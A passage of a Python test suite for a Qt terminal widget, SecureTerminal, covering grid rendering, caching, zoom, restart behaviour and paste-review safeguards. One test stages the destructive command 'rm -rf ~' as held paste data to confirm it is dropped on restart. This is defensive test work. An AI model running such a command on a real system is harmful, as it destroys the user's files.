   'after a render _top_rows holds the current history rows by reference')
_ir.shutdown()

# 13. Lowering the scrollback cap below the live-grid size prunes leading blocks
# immediately (setMaximumBlockCount), which would desync the incremental grid
# model (grid_rows / ids / sigs) from the document and let the next _delete_grid
# operate on a stale count. apply_scrollback resyncs the grid view, so the model
# stays aligned and output keeps rendering. (ai-review)
_sb = SecureTerminal(command='/bin/cat', tui=True)
_sb.apply_mode('show')
_sb.resize(700, 400)
_sb.show()
pump(40)
for _k in range(_sb._screen.lines):                 # fill a full grid of content
    _sb._feed_stream(('sbrow-%02d\r\n' % _k).encode())
_sb._render_tui()
ok(_sb._grid_rows > 3, 'a full grid rendered before lowering the scrollback cap')
_sb.apply_scrollback(3)                             # lower the cap BELOW the grid size
ok(_sb.document().blockCount() >= 1,
   'lowering the scrollback cap below the grid does not wipe the document')
eq(len(_sb._grid_row_sig), _sb._grid_rows,
   'the incremental model sigs stay aligned after a cap reduction')
eq(len(_sb._grid_row_ids), _sb._grid_rows,
   'the incremental model ids stay aligned after a cap reduction')
ok(_sb._grid_rows <= _sb.document().blockCount(),
   'grid_rows stays within the pruned document after a cap reduction')
_sb._feed_stream(b'past-cap-row\r\n')               # more output after the cap change
_sb._render_tui()                                   # must not crash on a stale model
ok('past-cap-row' in _sb.toPlainText(),
   'output after a cap reduction still renders (grid model resynced)')
_sb.shutdown()

# 14. Box mode is bounded in row-inserts too, not only show mode (#2): the
# incremental reconcile is mode-independent, so a distinct board fed progressively
# inserts each row about once, not once per read.
_bx = SecureTerminal(command='/bin/cat', tui=True)
_bx.apply_mode('box')
_bx.resize(1200, 700)
_bx.show()
pump(60)
_bxr = min(18, _bx._screen.lines - 2)
_bx_board = _distinct_board(min(60, _bx._screen.columns), _bxr)
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _feed_render_chunks(_bx, _bx_board, 12)
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_igr_calls[0] < 3 * _bxr,
   'box-mode incremental grid inserts each row ~once (%d inserts for %d rows over 12 reads), '
   'not once per read' % (_igr_calls[0], _bxr))
_bx.shutdown()

# 15. Scroll-flood linearity by INSERT COUNT (#3 checks byte-identity + a bounded
# live grid): feeding 3 screens of distinct rows over many reads inserts about one
# block per output row, promoting scrolled-off rows rather than re-drawing them. A
# full rebuild per read would be ~ visible_lines * reads; the incremental render
# stays ~ total rows.
_sf = _show_grid()
_sf_rows = _sf._screen.lines * 3
_sf_board = _distinct_board(min(50, _sf._screen.columns), _sf_rows)
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _feed_render_chunks(_sf, _sf_board, 20)
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_igr_calls[0] < 2 * _sf_rows,
   'scroll-flood inserts ~1 block per output row (%d inserts for %d rows over 20 reads), '
   'not one screen per read' % (_igr_calls[0], _sf_rows))
_sf.shutdown()

# 16. A no-change re-render inserts ZERO grid rows and deletes no block: the
# positional signature diff keeps every block, so the reconcile appends nothing
# (#7 checks the block count; this asserts the insert path explicitly).
_nn = _show_grid()
_nn._feed_stream(_distinct_board(min(40, _nn._screen.columns), 6))
_nn._render_tui()
_nn_bc = _nn.document().blockCount()
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _nn._render_tui()                                # identical state -> no append
finally:
    SecureTerminal._insert_grid_row = _orig_igr
eq(_igr_calls[0], 0,
   'a no-change re-render inserts zero grid rows (positional sig diff keeps all blocks)')
eq(_nn.document().blockCount(), _nn_bc, 'a no-change re-render deletes no block')
_nn.shutdown()

# 17. The _GridRow code-point model is DURABLE across scrollback promotion: a
# marked cell that scrolls off the live grid into permanent scrollback keeps its
# source code point, so _run_cp_at (hover) and the lossless transcript still name
# it -- a pyte-buffer lookup could not, the row is no longer in screen.buffer. This
# is why the grid stores the cp on the block, not only in the live buffer.
_pb = SecureTerminal(command='/bin/cat', tui=True)
_pb.apply_mode('box')
_pb.resize(700, 300)
_pb.show()
pump(40)
_pb._feed_stream((chr(0x202E) + '\r\n').encode())               # a lone RLO -> a box, row 0
_pb._render_tui()
for _pk in range(_pb._screen.lines + 5):                        # scroll row 0 into scrollback
    _pb._feed_stream(('fill-%02d\r\n' % _pk).encode())
    _pb._render_tui()
pump(5)
_grid_top = _pb.document().blockCount() - _pb._grid_rows        # first live-grid block
_pbox = None
_pblk = _pb.document().begin()
while _pblk.isValid():
    if _BX in _pblk.text() and _pblk.blockNumber() < _grid_top:   # a box BELOW the live grid
        _pbox = _pblk.position() + _pblk.text().index(_BX)
        break
    _pblk = _pblk.next()
ok(_pbox is not None, 'the marked box scrolled into permanent scrollback (below the live grid)')
eq(_pb._run_cp_at(_pbox), 0x202E,
   '_run_cp_at names a promoted-scrollback box (durable _GridRow across scroll)')
ok('<U+202E' in _pb.transcript_text(),
   'transcript names a promoted-scrollback neutralized codepoint (durable across scroll)')
_pb.shutdown()

# each reconcile widget owns a /bin/cat pty child; hang them up so the master fds and
# child processes do not linger into the suite's os._exit teardown.
for _rw in (_bp_no, _bp_yes, _hs, _dp, _tht, _rb, _sm):
    _rw.shutdown()


# --- cross-frame per-row signature cache (_grid_signatures) -------------------
# The grid render classifies every cell of a row (tui_cell + marking) to build its
# signature. _grid_signatures reuses last frame's runs for any row pyte did not mark
# dirty, so a partial repaint reclassifies a handful of rows, not the whole grid.

# CACHE-1. A partial repaint (change only the LAST grid row) reclassifies about one
# row, not screen.lines. The reconcile re-inserts only the divergent tail, so pinning
# the change to the last row isolates the signature-scan saving. Counts every
# _grid_row_runs call (signature pass + tail re-insert). CANARY: the pre-cache code
# ran the signature pass over every row each frame, so this count was >= screen.lines.
_orig_ggr = SecureTerminal._grid_row_runs
_ggr_calls = [0]


def _counting_ggr(self, row, columns):
    _ggr_calls[0] += 1
    return _orig_ggr(self, row, columns)


SecureTerminal._grid_row_runs = _counting_ggr
try:
    _cc = _show_grid()
    feed_output(_cc, b'\x1b[?1049h')                     # alt screen: a fixed canvas
    feed_output(_cc, b'\x1b[2J\x1b[1;1Htop-row')
    _cc._render_tui()                                    # first frame: cold cache, all rows
    _cc_lines = _cc._screen.lines
    _ggr_calls[0] = 0
    feed_output(_cc, ('\x1b[%d;1HBOTTOM' % _cc_lines).encode())   # repaint ONLY the last row
    _cc_dirty = len(_cc._screen.dirty)
    _cc._render_tui()
    _cc_partial = _ggr_calls[0]
    _cc.shutdown()
finally:
    SecureTerminal._grid_row_runs = _orig_ggr
ok(0 < _cc_dirty < _cc_lines,
   'pyte marks only the changed rows dirty (%d of %d) on a partial repaint'
   % (_cc_dirty, _cc_lines))
ok(_cc_partial < _cc_lines,
   'a one-row alt-screen repaint reclassifies few rows (%d _grid_row_runs), not the '
   'whole grid (%d) -- the cross-frame signature cache (fails on the pre-cache full scan)'
   % (_cc_partial, _cc_lines))

# CACHE-2. An OSC palette change (OSC 4) recolours cells with NO pyte dirty mark, so
# the row cache must be dropped in _osc_color -- else a cached row keeps the OLD colour.
# The incremental re-render must equal a full build in the new palette.
_pal = _show_grid()
_pal._osc['osc_colors'] = True
feed_output(_pal, b'\x1b[?1049h')
feed_output(_pal, b'\x1b[2J\x1b[1;1H\x1b[31mPALTEXT')             # palette index 1 (red) fg
_pal._render_tui()
feed_output(_pal, b'\x1b]4;1;rgb:00/ff/00\x07')                  # redefine index 1 -> green
_pal._render_tui()
_pal_ref = _show_grid()
_pal_ref._osc['osc_colors'] = True
feed_output(_pal_ref, b'\x1b[?1049h')
feed_output(_pal_ref, b'\x1b]4;1;rgb:00/ff/00\x07')              # same palette up front
feed_output(_pal_ref, b'\x1b[2J\x1b[1;1H\x1b[31mPALTEXT')
_pal_ref._render_tui()
eq(_doc_cells(_pal), _doc_cells(_pal_ref),
   'an OSC palette change re-renders cached rows in the new palette '
   '(_row_sig_cache cleared in _osc_color)')
_pal.shutdown()
_pal_ref.shutdown()


# CACHE-3. Oracle: for a corpus of frames (partial repaints, scroll, alt enter/leave,
# mode/markings/theme/palette changes), rendering WITH the row cache is byte-identical
# (content + every format) to rendering with the cache force-cleared every frame. This
# is the definitive guard that no cached row is ever stale, and exercises every
# _grid_signatures branch (cold miss, dirty row, cursor row, and the reuse path).
def _oracle_cells(disable_cache):
    _t = _show_grid()
    _t._osc['osc_colors'] = True
    if disable_cache:
        _orig_sig = _t._grid_signatures
        # Clear the cache before each signature pass -> every row recomputed each
        # frame: the no-cache baseline the cached path must match exactly.
        _t._grid_signatures = lambda screen: (_t._row_sig_cache.clear()
                                              or _orig_sig(screen))
    _steps = [
        b'\x1b[?1049h',                                  # enter alt screen
        b'\x1b[2J\x1b[1;1H\x1b[38;2;200;0;0mHEADER',     # truecolour row 0
        b'\x1b[5;1Hmid-\x1b[32mgreen',                   # partial: new row 4
        b'\x1b[5;9HMID2',                                # partial: same row again
        b'\x1b[10;1H' + b'x' * 20,                       # another partial row
        b'\x1b]4;2;rgb:12/34/56\x07',                    # palette change (cache clear)
    ]
    for _s in _steps:
        feed_output(_t, _s)
        _t._render_tui()
    _t.apply_markings(True)                              # cache clear -> re-render
    _t._render_tui()
    _t.apply_theme('light')                              # cache clear -> re-render
    _t._render_tui()
    feed_output(_t, b'\x1b[?1049l')                      # leave alt screen (grid reset)
    _t._render_tui()
    _cells = _doc_cells(_t)
    _t.shutdown()
    return _cells


eq(_oracle_cells(False), _oracle_cells(True),
   'render WITH the row cache == render with the cache force-cleared every frame '
   '(no cached grid row is ever stale)')


# CACHE-4. In-place middle reconcile: when a frame keeps the same row count (a
# full-screen program repainting a band), changing even the TOP row rewrites only
# the changed block IN PLACE -- it does NOT delete and re-insert every row below.
# CANARY: the prefix-only reconcile re-inserted the whole grid when row 0 changed.
_orig_igr2 = SecureTerminal._insert_grid_row
_igr2 = [0]


def _counting_igr2(self, cursor, row, columns, cell_runs=None):
    _igr2[0] += 1
    return _orig_igr2(self, cursor, row, columns, cell_runs)


SecureTerminal._insert_grid_row = _counting_igr2
try:
    _ip = _show_grid()
    feed_output(_ip, b'\x1b[?1049h')
    feed_output(_ip, b'\x1b[2J\x1b[1;1HTOP\x1b[2;1Hmid\x1b[3;1Hbot')
    _ip._render_tui()                                   # first frame: inserts the grid
    _igr2[0] = 0
    feed_output(_ip, b'\x1b[1;1HTOPX')                  # change ONLY the top row
    _ip._render_tui()
    _ip_ins = _igr2[0]
    _ip_txt = _ip.toPlainText()
    _ip.shutdown()
finally:
    SecureTerminal._insert_grid_row = _orig_igr2
ok(_ip_ins == 0,
   'a same-row-count top-row repaint rewrites in place (%d grid-row inserts, want 0) -- '
   'not a full re-insert of every row below the change' % _ip_ins)
ok('TOPX' in _ip_txt and 'bot' in _ip_txt,
   'the in-place top-row repaint shows the new top and keeps the rows below')

# CACHE-5. The in-place top-row reconcile is byte-identical (content + every format)
# to a fresh full build already in the final state -- no stale block survives.
_ipa = _show_grid()
feed_output(_ipa, b'\x1b[?1049h')
feed_output(_ipa, b'\x1b[2J\x1b[1;1H\x1b[31mAAA\x1b[2;1H\x1b[32mBBB\x1b[3;1H\x1b[34mCCC')
_ipa._render_tui()
feed_output(_ipa, b'\x1b[1;1H\x1b[33mZZZ')             # recolour + change the TOP row in place
_ipa._render_tui()
_ipb = _show_grid()
feed_output(_ipb, b'\x1b[?1049h')
feed_output(_ipb, b'\x1b[2J\x1b[1;1H\x1b[33mZZZ\x1b[2;1H\x1b[32mBBB\x1b[3;1H\x1b[34mCCC')
_ipb._render_tui()
eq(_doc_cells(_ipa), _doc_cells(_ipb),
   'in-place top-row reconcile == a full rebuild (content + every format)')
_ipa.shutdown()
_ipb.shutdown()

# CACHE-6. A middle-band change with BOTH ends unchanged keeps the shared prefix AND
# suffix and rewrites only the middle (the suffix-match path): still byte-identical.
_mb = _show_grid()
feed_output(_mb, b'\x1b[?1049h')
feed_output(_mb, b'\x1b[2J\x1b[1;1Hr0\x1b[2;1Hr1\x1b[3;1Hr2\x1b[4;1Hr3\x1b[5;1Hr4')
_mb._render_tui()
feed_output(_mb, b'\x1b[3;1HMIDDLE')                   # change only row 2 (index 2)
_mb._render_tui()
_mb_ref = _show_grid()
feed_output(_mb_ref, b'\x1b[?1049h')
feed_output(_mb_ref, b'\x1b[2J\x1b[1;1Hr0\x1b[2;1Hr1\x1b[3;1HMIDDLE\x1b[4;1Hr3\x1b[5;1Hr4')
_mb_ref._render_tui()
eq(_doc_cells(_mb), _doc_cells(_mb_ref),
   'a middle-band in-place reconcile (shared prefix+suffix) == a full rebuild')
ok('r0' in _mb.toPlainText() and 'MIDDLE' in _mb.toPlainText() and 'r4' in _mb.toPlainText(),
   'the middle-band reconcile keeps both ends and updates the middle')
_mb.shutdown()
_mb_ref.shutdown()

# CACHE-7. Shrink-to-prefix: the grid loses trailing rows while every kept row is
# unchanged (target is a strict prefix of the live grid), so the unequal-length
# fallback deletes the tail and appends NOTHING -- the empty-append guard path.
_spg = SecureTerminal(command='/bin/cat', tui=True)
_spg.apply_mode('show')
_spg.resize(700, 300)
_spg.show()
pump(40)
_spg._feed_stream(b'\x1b[1;1Ha\x1b[2;1Hb\x1b[3;1Hc')   # three content rows
_spg._render_tui()
_sp_tall = _spg.document().blockCount()
_spg._feed_stream(b'\x1b[3;1H\x1b[2K\x1b[2;2H')         # blank row 3, cursor up to row 2
_spg._render_tui()
ok(_spg.document().blockCount() < _sp_tall,
   'shrink-to-prefix drops the trailing row (empty-append fallback)')
_sp_txt = _spg.toPlainText()
ok('a' in _sp_txt and 'b' in _sp_txt and 'c' not in _sp_txt,
   'shrink-to-prefix keeps the unchanged leading rows and drops the removed tail')
_spg.shutdown()

# CACHE-8. Shrink-RESIZE with an out-of-bounds cursor must not corrupt committed
# scrollback. pyte's resize() does NOT reposition the cursor on a shrink, so cursor.y is
# left past the shrunk screen; _grid_signatures must clamp it, else max(last, cursor_y) is
# OOB -> _render_primary_grid builds `target` longer than the signatures -> _grid_rows
# overcounts -> grid_top drifts into permanent (immutable) scrollback. CANARY: pre-fix
# _grid_rows stayed at the OOB row count and a later frame overwrote the scrollback.
_rs = SecureTerminal(command='/bin/cat', tui=True)
_rs.apply_mode('show')
_rs.resize(700, 400)
_rs.show()
pump(40)
_rs_lines0 = _rs._screen.lines
for _i in range(_rs_lines0 * 3):                        # promote rows into permanent scrollback
    _rs._feed_stream(('rs%02d\r\n' % _i).encode())
    _rs._render_tui()
_rs_doc = _rs.document()
_rs_gridtop = _rs_doc.blockCount() - _rs._grid_rows
_rs_sb = [_rs_doc.findBlockByNumber(_b).text() for _b in range(_rs_gridtop)]   # committed scrollback
_rs._screen.cursor.y = _rs._screen.lines - 1           # caret at the bottom row
_rs_new = max(3, _rs_lines0 // 2)
_rs._screen.resize(_rs_new, _rs._screen.columns)       # SHRINK; pyte leaves cursor.y OOB
ok(_rs._screen.cursor.y > _rs._screen.lines - 1,
   'pyte leaves the cursor out of bounds after a shrink (the trigger)')
_rs._render_tui()
eq(_rs._grid_rows, _rs._screen.lines,
   'a shrink-resize with an OOB cursor keeps _grid_rows == screen.lines, not the OOB count')
# and a subsequent frame must not overwrite the committed scrollback (immutable-scrollback)
_rs._feed_stream(b'after-resize\r\n')
_rs._render_tui()
_rs_sb_after = [_rs_doc.findBlockByNumber(_b).text() for _b in range(len(_rs_sb))]
eq(_rs_sb_after, _rs_sb,
   'committed scrollback is byte-unchanged across a shrink-resize and a later frame')
# and the Qt CARET uses the CLAMPED bottom row for its column, not a fabricated blank OOB
# row (the sibling _place_grid_cursor bug, same unclamped-cursor.y class). Put a multi-
# UTF-16-unit astral glyph on the bottom row so a blank OOB row would compute a different
# caret offset; assert the OOB-cursor caret lands identically to an in-bounds one.
_rs_last = _rs._screen.lines - 1
_rs._feed_stream(('\x1b[%d;1H\U0001F600Z' % (_rs_last + 1)).encode())
_rs._screen.cursor.y = _rs_last
_rs._screen.cursor.x = 1                                # in-bounds, just past the astral glyph
_rs._render_tui()
_rs_caret_ib = _rs.textCursor().position()
_rs._screen.cursor.y = _rs_last + 9                     # left OOB (below the shrunk screen)
_rs._screen.cursor.x = 1
_rs._render_tui()
_rs_caret_oob = _rs.textCursor().position()
eq(_rs_caret_oob, _rs_caret_ib,
   'the Qt caret uses the clamped bottom row for its column after an OOB shrink (a blank '
   'fabricated row would drop the astral glyph width and misplace it)')
_rs.shutdown()


# --- render-loop performance + review fixes (perf cycle) ----------------------
from secure_terminal.sanitize import has_bell as _p37_has_bell

# per-tab render gating: interval branches + deferred catch-up (grid mode)
_p37g = SecureTerminal(command='/bin/cat', tui=True)
_p37g.resize(400, 300); _p37g.show(); APP.processEvents()
ok(_p37g._render_active is True and _p37g._render_interval() == 16, 'gating: active interval 16ms')
_p37g.set_render_active(False)
ok(_p37g._render_active is False and _p37g._render_interval() == _p37g._HIDDEN_RENDER_MS,
   'gating: hidden interval is the slow cadence')
_p37g._feed_bytes(b'\x1b[HCATCHUP')
ok(_p37g._screen.buffer[0][0].data == 'C', 'gating: a hidden tab still feeds its pyte model')
ok('CATCHUP' not in _p37g.document().toPlainText(), 'gating: the hidden grid render is deferred')
_p37g.set_render_active(True); APP.processEvents()
ok('CATCHUP' in _p37g.toPlainText(), 'gating: becoming active renders the frame fed while hidden')
_p37g.set_render_active(True)
ok(_p37g._render_active is True, 'gating: set_render_active is idempotent')
_p37g.shutdown()

# CLI catch-up via _flush_paint (assert on _paint_dirty, not toPlainText which flushes)
_p37c = SecureTerminal(command='/bin/cat', tui=False)
_p37c.resize(400, 300); _p37c.show(); APP.processEvents()
_p37c.set_render_active(False)
_p37c._feed_line('hello-cli\n', defer=True)
ok(_p37c._paint_dirty is True, 'gating: a hidden CLI tab defers the paint')
_p37c.set_render_active(True); APP.processEvents()
ok(_p37c._paint_dirty is False, 'gating: becoming active flushes the deferred CLI paint')
ok('hello-cli' in _p37c.toPlainText(), 'gating: the deferred CLI line shows on catch-up')
_p37c.shutdown()

# A: getter-staleness -- transcript/toPlainText force a pending grid render
_p37a = SecureTerminal(command='/bin/cat', tui=True)
_p37a.resize(400, 300); _p37a.show(); APP.processEvents()
_p37a.set_render_active(False)
_p37a._feed_bytes(b'\x1b[HFRESHFRAME'); _p37a._render_timer.start(500)
ok('FRESHFRAME' in _p37a.transcript_text(), 'A: transcript_text forces the pending grid render')
ok(not _p37a._render_timer.isActive(), 'A: the pending render was consumed')
_p37a._feed_bytes(b'\x1b[2;1HSECOND'); _p37a._render_timer.start(500)
ok('SECOND' in _p37a.toPlainText(), 'A: toPlainText forces the pending grid render too')
_p37a.shutdown()

# B: teardown guard -- set_render_active(True) on a torn-down widget must not render
_p37b = SecureTerminal(command='/bin/cat', tui=True)
_p37b.resize(400, 300); _p37b.show(); APP.processEvents()
_p37b.set_render_active(False)
_p37b.shutdown()
_p37b_rendered = []
_p37b._render_tui = lambda: _p37b_rendered.append(1)
_p37b.set_render_active(True)
ok(_p37b_rendered == [], 'B: set_render_active(True) after shutdown skips the catch-up render')
ok(_p37b._render_active is True, 'B: the flag still flips (only the render is guarded)')

# C: hidden-CLI _paint_pending is capped to scrollback (no unbounded growth)
_p37p = SecureTerminal(command='/bin/cat', tui=False)
_p37p.resize(400, 300); _p37p.show(); APP.processEvents()
_p37p._scrollback = 100
_p37p.set_render_active(False)
for _p37i in range(500):
    _p37p._feed_line('line %d\n' % _p37i, defer=True)
ok(len(_p37p._paint_pending) <= 100, 'C: hidden CLI _paint_pending capped to scrollback')
ok(len(_p37p._paint_pending_wraps) == len(_p37p._paint_pending), 'C: wraps stay parallel to pending')
_p37p.shutdown()

# D: single zoom notch applies the font once (trailing same-size apply no-ops)
_p37z = SecureTerminal(command='/bin/cat', tui=True)
_p37z.resize(400, 300); _p37z.show(); APP.processEvents()
_p37z._zoom_debounce_ms = 40
_p37z.apply_zoom(150); APP.processEvents()
_p37z_big = _p37z.font().pointSize()
ok(_p37z.current_zoom() == 150 and _p37z_big > 0, 'D: a zoom notch applies immediately (leading edge)')
_p37z._render_timer.stop()
_p37z._apply_font()
ok(not _p37z._render_timer.isActive(), 'D: a same-size _apply_font no-ops (no second relayout)')
_p37z_applied = _p37z._applied_font_size
_p37z.set_font_size(20)
ok(_p37z._applied_font_size != _p37z_applied, 'D: a genuine font-size change is not skipped')
# burst coalescing: a follow-up while the timer is armed is not applied yet
_p37z._zoom_debounce_ms = 40
_p37z.apply_zoom(120); APP.processEvents()
_p37z_f = _p37z.font().pointSize()
_p37z.apply_zoom(90)
ok(_p37z.current_zoom() == 90 and _p37z.font().pointSize() == _p37z_f,
   'D: a burst follow-up is coalesced (font not re-applied yet)')
ok(_p37z._zoom_timer.isActive(), 'D: the zoom debounce timer is armed for the final size')
_p37z.shutdown()

# has_bell fast-reject: identical to the regex path
ok(_p37_has_bell('\x07') is True, 'bell: a standalone BEL is detected')
ok(_p37_has_bell('hello world') is False, 'bell: no BEL byte -> False (fast path)')
ok(_p37_has_bell('\x1b]0;title\x07') is False, 'bell: an OSC-terminating BEL is not a standalone bell')
ok(_p37_has_bell('ring\x07now') is True, 'bell: a real BEL among text is detected')
ok(_p37_has_bell('') is False, 'bell: empty string -> False')



# --- security cycle: SEC-9 (reviewed paste dispatch) + SEC-4 (interrupted CSI leak) ---
_p9 = SecureTerminal(command='/bin/cat', tui=False)
_p9.resize(400, 300); _p9.show(); APP.processEvents()
_p9.has_foreground_program = lambda: False
_p9._bracketed_paste_active = lambda: False
_p9_disp = []
_p9._dispatch_paste = lambda r, a: _p9_disp.append((r, a))
_p9._review_active = True
_p9._pending_paste = 'a\nb'
_p9.dispatch_pending_paste('stripped')
ok(_p9_disp == [('a\nb', 'stripped')],
   'SEC-9: a resolved paste review dispatches through the sanitizing paste path')
# reject / no-op paths
_p9._review_active = True
_p9._pending_paste = 'x'
_p9.dispatch_pending_paste('reject')
ok(_p9_disp == [('a\nb', 'stripped')], 'SEC-9: a rejected paste dispatches nothing')
_p9.shutdown()

# SEC-4: an interrupted CSI (params, no final byte) must not leak its param bytes as text
_p4 = SecureTerminal(command='/bin/cat', tui=False)
_p4.resize(400, 300); _p4.show(); APP.processEvents()
_p4._feed_line('\x1b[38;5;123\nAFTER')
_p4t = _p4.toPlainText()
ok('38;5;123' not in _p4t, 'SEC-4: an interrupted CSI does not leak its param bytes as literal text')
ok('AFTER' in _p4t, 'SEC-4: the text after an interrupted CSI still renders')
_p4.shutdown()


# --- setter int32 sink clamps: a huge value cannot wrap/overflow downstream --------
# apply_paste_delay reaches the paste-review gate on a pyqtSignal(str, int) C int, where an
# out-of-int32 value WRAPS to a negative that review.py floors to 0 -- silently skipping the
# countdown and enabling the paste buttons at once. Clamp at the sink so every entry point
# (/paste-delay command, config, ctl) is safe. CANARY: pre-fix stored the raw value unclamped.
_cl = SecureTerminal(command='/bin/cat', tui=False)
_cl.resize(400, 300); _cl.show(); APP.processEvents()
_cl.apply_paste_delay(10**20)
eq(_cl._paste_delay, 2147483647,
   'apply_paste_delay clamps a huge value to int32 (no pyqtSignal wrap -> paste-review '
   'countdown still gates)')
_cl.apply_paste_delay(5)
eq(_cl._paste_delay, 5, 'apply_paste_delay keeps an in-range value')
_cl.apply_escape_limit(10**20)
eq(_cl._escape_limit, 2147483647, 'apply_escape_limit clamps a huge value to int32 at the sink')
_cl.shutdown()

# --- disabling osc_colors repaints already-rendered CLI scrollback -----------------
# apply_osc('osc_colors', False) routes through apply_theme(self._theme), which no-ops its
# own _rerender on an UNCHANGED theme (the #78 restore guard) -- so a CLI/line view kept the
# program's OSC palette colours in its scrollback. The disable branch now _rerender()s too,
# like apply_colors / apply_markings.
_oc = SecureTerminal(command='/bin/cat', tui=False)
_oc.resize(400, 300); _oc.show(); APP.processEvents()
_oc.apply_osc('osc_colors', True)
_oc._handle_osc(b'\x1b]10;#33cc99\x07')                 # record an OSC 10 default-fg override
ok(_oc._osc_palette.get('fg') == '#33cc99', 'osc_colors on: the OSC 10 fg override is recorded')
_rr = []
_orig_rr = _oc._rerender


def _oc_rerender():
    _rr.append(1)
    return _orig_rr()


_oc._rerender = _oc_rerender
_oc.apply_osc('osc_colors', False)                      # disable in CLI/line mode
_oc._rerender = _orig_rr
ok(_rr == [1],
   'disabling osc_colors re-renders the CLI/line view (repaints scrollback out of the program '
   'palette) -- apply_theme alone no-ops its _rerender on an unchanged theme')
ok(_oc._osc_palette == {}, 'disabling osc_colors clears the OSC palette back to the theme')
_oc.shutdown()


# --- zoom updates the CLI pty width (winsize) --------------------------------
# A zoom changes how many columns fit even though the widget did not resize. In
# CLI (line) mode _sync_tui_size no-ops (no pyte screen), so _apply_font must push
# the new winsize itself -- else the shell keeps formatting to the OLD wider column
# count and its prompt/line overflows the narrower viewport (right-truncated, no
# wrap, horizontal caret-follow jump). Direction, not an exact width, so it is
# font-robust: a larger glyph always yields fewer columns.
_zcw = SecureTerminal(command='/bin/cat', tui=False)
_zcw.resize(800, 400)
_zcw.show()
pump(60)
_zc_100 = _zcw._cols
_zcw.apply_zoom(200)
pump(120)                                  # past the zoom debounce
_zc_200 = _zcw._cols
_zcw.apply_zoom(100)
pump(120)
_zc_back = _zcw._cols
ok(_zc_200 < _zc_100 and _zc_back == _zc_100,
   'CLI zoom pushes the new pty width: fewer cols at 200 percent, restored at 100')
_zcw.shutdown()

# _sync_tui_size is a no-op with no pyte screen (CLI mode): its callers all guard for
# a screen (zoom takes the _set_winsize path in CLI), so exercise the guard directly.
_sts = SecureTerminal(command='/bin/cat', tui=False)
_sts._sync_tui_size()
ok(_sts._screen is None, '_sync_tui_size is a safe no-op with no pyte screen (CLI)')
_sts.shutdown()


# --- restart_as_shell: a -- PROGRAM tab drops to a shell instead of closing ---
# A tab launched to run a specific program restarts in place as a fresh login shell
# when that program exits (gnome-terminal/konsole 'restart' disposition), keeping
# the widget + its settings; a plain login-shell tab is a no-op (the window closes
# it). Drives a real short-lived child to exit, then asserts the restart.
_rs = SecureTerminal(command=['/bin/sh', '-c', 'exit 0'], tui=False)
_rs.resize(600, 300)
_rs.show()
pump(400)                                  # let the child exit (shell_exited fires)
_rs_oldpid = _rs._pid
_rs_ret = _rs.restart_as_shell()
pump(300)
_rs._write(b'echo RESTARTOK\n')
pump(500)
_rs_doc = _rs.document().toPlainText()
ok(_rs_ret is True and _rs._command is None and _rs._pid is not None
   and _rs._pid != _rs_oldpid and _rs._fd is not None
   and 'RESTARTOK' in _rs_doc,
   'restart_as_shell: a -- PROGRAM tab respawns a working login shell in place')
_rs.shutdown()

_rs2 = SecureTerminal(command=None, tui=False)
_rs2.resize(600, 300)
_rs2.show()
pump(200)
ok(_rs2.restart_as_shell() is False,
   'restart_as_shell: a plain login-shell tab is a no-op (the window closes it)')
_rs2.shutdown()

# TUI restart: the exited program's alt-screen frame is discarded and the grid replays
# a fresh banner + shell (a blank grid here would be the bug -- the old frame frozen).
_rst = SecureTerminal(command=['/bin/sh', '-c', 'exit 0'], tui=True)
_rst.resize(600, 300)
_rst.show()
pump(400)
ok(_rst.restart_as_shell() is True, 'restart_as_shell (TUI): a -- PROGRAM tab respawns')
# Sample the banner BEFORE pumping: restart_as_shell replays it into the grid
# synchronously, but a subsequent shell prompt that emits a CSI screen-clear could
# wipe the correctly-replayed banner during the pump -- a latent false-positive if we
# read it after. Assert the replay at restart time, the live shell separately.
_rst_banner = _rst.document().toPlainText()
pump(300)
_rst._write(b'echo TUIRESTART\n')
pump(500)
ok('program exited -- new shell' in _rst_banner and _rst_banner.strip() != ''
   and 'TUIRESTART' in _rst.document().toPlainText(),
   'restart_as_shell (TUI): grid replays the banner + a working shell, not a blank frame')
_rst.shutdown()

# SECURITY: a pending paste-review (or copy) is dropped on restart -- the reviewed text
# targeted the exited program's shell; carrying it into the fresh shell would inject
# unreviewed input. The review bar is dismissed (paste_review_resolved) too.
_rsr = SecureTerminal(command=['/bin/sh', '-c', 'exit 0'], tui=False)
_rsr.resize(600, 300)
_rsr.show()
pump(400)
_rsr._review_active = True
_rsr._pending_paste = 'reviewed\ncommand'
_rsr_resolved = []
_rsr.paste_review_resolved.connect(lambda: _rsr_resolved.append(1))
ok(_rsr.restart_as_shell() is True, 'restart_as_shell clears review: restart succeeds')
ok(_rsr._review_active is False and _rsr._pending_paste is None and bool(_rsr_resolved),
   'restart_as_shell drops a pending paste-review and dismisses the bar (no injection)')
_rsr.shutdown()

# SECURITY: a STAGED multi-line paste queued for the exited program's shell is dropped
# on restart too -- else a later unrelated Enter would feed a line reviewed for the OLD
# program's context into the fresh login shell.
_rst_stage = SecureTerminal(command=['/bin/sh', '-c', 'exit 0'], tui=False)
_rst_stage.resize(600, 300)
_rst_stage.show()
pump(400)
_rst_stage._staged_paste = ['rm -rf ~', 'reboot']
ok(_rst_stage.restart_as_shell() is True,
   'restart_as_shell (held paste): restart succeeds')
ok(_rst_stage._staged_paste == [],
   'restart_as_shell drops a held paste (no leak into the new shell)')
_rst_stage.shutdown()


# --- our own blinking cursor keeps blinking through a selection --------------
# The native Qt caret stops blinking whenever the text cursor holds a selection, so
# selecting text froze the prompt caret (konsole keeps it blinking). We hide the
# native caret and draw our own at the OUTPUT cursor, decoupled from the selection.
APP.setCursorFlashTime(1000)
_cur = SecureTerminal(command=['/bin/sh'], tui=False)
_cur.resize(600, 300)
_cur.show()
_cur.setFocus()
pump(200)
_cur._write(b'echo hello\n')
pump(400)
ok(_cur.cursorWidth() == 0, 'the native Qt caret is hidden (we draw our own)')
ok(_cur._blink_timer.isActive(), 'the cursor blinks (timer runs) while focused')
_cur_out = _cur._out_cursor.position()
# select some earlier text: the text cursor moves to the selection end, but the
# DRAWN cursor must stay at the output cursor and keep blinking.
_selc = _cur.textCursor()
_selc.setPosition(0)
_selc.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
_cur.setTextCursor(_selc)
ok(_cur.textCursor().hasSelection()
